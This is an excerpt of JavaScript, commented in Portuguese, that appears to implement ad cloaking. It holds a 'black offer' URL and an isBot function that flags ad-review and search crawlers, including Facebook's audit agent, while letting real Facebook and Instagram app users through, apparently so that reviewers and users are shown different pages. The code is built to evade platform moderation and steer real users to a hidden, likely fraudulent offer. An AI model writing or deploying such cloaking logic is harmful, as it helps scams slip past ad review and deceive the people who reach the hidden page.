...
const URL_OFERTA_BLACK = "https://app-mercadomelhoresdomes.app/283569147"; 
 ...
 * IMPORTANTE: Diferencia entre bots do Meta e usuários reais dos apps Facebook/Instagram
 */
function isBot(userAgent) {
    ...
    const blacklist = [
        ...
        "googlebot", "facebookexternalhit", "adsbot-google", 
        "twitterbot", "bingbot", "slurp", "duckduckbot", "baiduspider", 
        "yandexbot", "sogou", "exabot", "ia_archiver",
        // REMOVIDO: "facebot" e "facebookbot" - bloqueavam usuários reais dos apps
        ...
        "fb_iab", // Ferramenta de auditoria do Facebook
    ...
    // Verificação adicional para usuários reais de apps Meta (Facebook/Instagram)
    // Usuários reais têm "FBAN/FBIOS", "FBAN/FBANDROID", "Instagram" ou "FBAN/MessengerForiOS" no User-Agent
    if (isMobile(userAgent)) {
        const hasMetaAppIndicator = /fban\/fb|fban\/messenger|instagram/i.test(userAgentLower);
        if (hasMetaAppIndicator) {
            return false; // Não é bot, é usuário real do app
        }
    }
